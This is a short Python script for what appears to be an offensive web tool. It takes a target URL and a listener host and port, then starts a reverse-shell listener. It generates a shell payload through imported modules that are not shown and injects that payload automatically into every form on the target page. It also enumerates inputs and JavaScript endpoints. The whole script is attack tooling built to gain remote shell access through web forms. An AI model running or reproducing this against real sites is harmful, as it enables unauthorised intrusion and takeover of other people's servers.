#!/usr/bin/python

import argparse

from payloads import Monkey, Generator

from server import ReverseListener

parser = argparse.ArgumentParser(description='Test')

parser.add_argument('target_url', help='Target URL')
parser.add_argument('-lhost', '--lhost', help='Server the payload connects to', default='127.0.0.1')
parser.add_argument('-lport', '--lport', help='Port of the server the payload connects to', default='80')
parser.add_argument('-v', '--verbose', action='store_true', help='Increase output verbosity')

args = parser.parse_args()

print(f"target_url: {args.target_url}")

if args.verbose:
    pass
    # TODO

if not args.target_url:
    print("Target URL required")
    exit(1)

if not "http" in args.target_url:
    print("No protocol specified")
    exit(1)

if not args.lhost:
    print("No -lhost specified")
    exit(1)

LHOST = args.lhost
LPORT = args.lport

def on_recv(data):
    print("".join([d.decode() for d in data]))

monkey = Monkey(args.target_url)

generator = Generator(lhost=LHOST, lport=LPORT)

listener = ReverseListener(ip=LHOST, port=LPORT, recv_cb=on_recv, once=False)

listener.start()

# bs4 bs
if monkey.get_forms():
    monkey.autoinject_forms(generator.ishell())

print(monkey.get_inputs())

# lists
print(monkey.get_js_endpoints())
print(monkey.get_js_urls())

